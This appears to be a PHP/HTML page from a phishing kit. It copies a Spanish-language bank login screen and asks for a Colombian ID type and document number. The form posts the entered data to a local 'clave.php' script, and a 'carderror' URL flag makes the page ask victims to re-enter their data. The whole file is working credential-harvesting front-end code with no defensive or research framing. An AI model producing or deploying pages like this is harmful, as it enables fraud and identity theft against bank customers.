<?php
session_start();
?>

<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Usuario</title>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
    />
    <link rel="stylesheet" href="../amano/css/estilos.css" />
    <script src="./js/jquery-3.6.0.min.js"></script>
    <style>
      .select-container {
        position: relative;
        margin-bottom: 20px;
      }

      .select-custom {
        border: none;
        border-bottom: 2px solid #6d6e72;
        width: calc(100% - 30px);
        padding: 10px 30px 10px 40px;
        appearance: none;
        background: transparent;
        pointer-events: none;
      }

      .icon-left {
        position: absolute;
        left: 24px;
        top: 10px;
        width: 25px;
        height: 20px;
        pointer-events: none;
      }

      .arrow-icon {
        position: absolute;
        right: 20px;
        top: 10px;
        width: 20px;
        height: 20px;
        pointer-events: none;
      }

      .overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
      }

      .modal-select {
        display: none;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: white;
        border-radius: 10px 10px 0 0;
        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
        padding: 30px;
        height: 300px;
        overflow-y: auto;
      }

      .modal-select .samoa {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
      }

      .modal-select .samoa .close {
        cursor: pointer;
        margin-left: auto;
      }

      .modal-select button {
        width: 100%;
        border-radius: 25px;
        margin-top: 50px;
        background-color: white;
        border: 2px solid black;
        font-weight: bold;
        padding: 10px;
      }

      .option {
        display: block;
        text-align: center;
        cursor: pointer;
        padding: 15px 0;
        /* border-bottom: 1px solid #eee; */
      }

      .option:last-child {
        border-bottom: none;
      }

      .option.selected {
        font-weight: bold;
      }
      @media (max-width: 768px) {
        .select-custom {
          color: black;
          background: transparent;
        }

        .modal-select button {
          color: black;
          background: transparent;
          border: 2px solid black;
        }

        .modal-select button:hover {
          background: rgba(0, 0, 0, 0.1);
        }
      }
    </style>
  </head>
  <body>
    <div class="gif-background"></div>
    <div class="container-fluid header">
      <div class="row py-2">
        <div class="col text-left">
          <a href="#" class="text-dark">
            <img
              src="../amano/tom/x.svg"
              alt="Cerrar"
              width="20px"
              class="img-fluid"
              style="vertical-align: middle"
            />
          </a>
        </div>
        <div class="col text-center">
          <img
            src="../amano/tom/lg.png"
            alt="Logo"
            width="30px"
            class="img-fluid logo"
          />
        </div>
        <div class="col text-right">
          <a href="#" class="text-dark">
            Continuar
            <img
              src="../amano/tom/felcha.svg"
              alt="Continuar"
              width="20px"
              class="img-fluid"
              style="vertical-align: middle"
            />
          </a>
        </div>
      </div>
    </div>



    <form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar"
            name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="../amano/clave.php"
            enctype="application/x-www-form-urlencoded">





    <div class="container nubes">
      <h2 class="titulo">Ingresa</h2>
      <p class="mensaje">Con tu numero y tipo de documento.</p>
      <div
        id="error-message"
        class="text-danger"
        style="display: none; margin-top: 10px"
      >
        Inténtalo de nuevo, datos erróneos.
      </div>
      <div class="demencia-ok">
        <div class="select-container">
          <img src="../amano/tom/card.png" alt="Icono" class="icon-left" />
          <select id="tipoDocumento" name="apellido" class="select-custom">
            <option value="" disabled selected>Tipo de documento</option>
            <option value="cedula">Cédula de Ciudadanía</option>
            <option value="tarjeta">Tarjeta de Identidad</option>
          </select>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            fill="currentColor"
            class="bi bi-chevron-down arrow-icon"
            viewBox="0 0 16 16"
          >
            <path
              fill-rule="evenodd"
              d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708"
            />
          </svg>
        </div>

        <input
          type="tel"
          id="txtUsuario"
          name="socialusu"
          maxlength="10"
          class="gotens-kame-us"
          placeholder=" "
        />
        <label class="corocoro-nombre">
          <span class="text-nomb">Ingresa tu documento</span>
        </label>
      </div>
    </div>
    <div class="text-center mt-3">
      <button id="btnUsuario" name="btnUsuario" class="ban-boom" disabled>
        CONTINUAR
      </button>
    </div>

    <div class="sas" style="text-align: center; top: 5px; margin-top: 20px">
      <a href="#" class="text-dark">¿No eres cliente?</a>
    </div>

    <div class="overlay" id="overlay"></div>

    <div class="modal-select" id="modalSelect">
      <div class="samoa">
        <span style="text-align: center; flex-grow: 1">Tipo de Documento</span>
        <span class="close" id="closeModal">
          <img src="../amano/tom/x.svg" alt="Cerrar" style="width: 20px; height: 20px" />
        </span>
      </div>

      <div>
        <div class="option" data-value="cedula">Cédula de Ciudadanía</div>
        <div class="option" data-value="tarjeta">Tarjeta de Identidad</div>
      </div>
      <button id="btnCloseModal">Cerrar</button>
    </div>

    <!-- Scripts de Bootstrap -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
      var gifBackground = document.querySelector(".gif-background");
      setTimeout(function () {
        gifBackground.classList.add("hidden");
      }, 5000);

      document
        .getElementById("txtUsuario")
        .addEventListener("input", function () {
          var btnUsuario = document.getElementById("btnUsuario");
          btnUsuario.disabled = this.value.length < 5;
        });
    </script>
    <script>
      $(document).ready(function () {
        $(".select-container").on("click", function (e) {
          e.preventDefault();
          $("#overlay").show();
          $("#modalSelect").slideDown();
        });

        $("#closeModal, #btnCloseModal").on("click", function () {
          $("#overlay").hide();
          $("#modalSelect").slideUp();
        });

        $(".option").on("click", function () {
          $(".option").removeClass("selected");
          $(this).addClass("selected");
          $("#tipoDocumento").val($(this).data("value")).change();
          $("#closeModal").click();
        });

        $("#overlay").on("click", function () {
          $("#closeModal").click();
        });
      });

      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get("carderror") === "true") {
        $("#error-message").show();
      }
    </script>
  </body>
</html>
